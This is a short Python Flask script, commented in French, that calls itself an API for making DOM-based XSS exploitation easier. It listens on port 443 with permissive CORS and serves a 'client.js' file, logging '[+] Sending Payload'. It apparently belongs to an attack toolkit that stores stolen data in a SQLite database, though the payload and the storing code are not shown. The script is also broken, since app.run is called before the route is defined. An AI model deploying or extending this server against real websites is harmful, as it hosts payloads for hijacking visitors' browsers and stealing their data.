# API qui va avec la base de données servant à faciliter l'exploitation d'une XSS DOM-based
# 
# Prérequis : 
# sudo pip3 install flask_cors
# openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
#
# Utilisation : sudo python3 9_Gestion_API.py



from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"
app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')
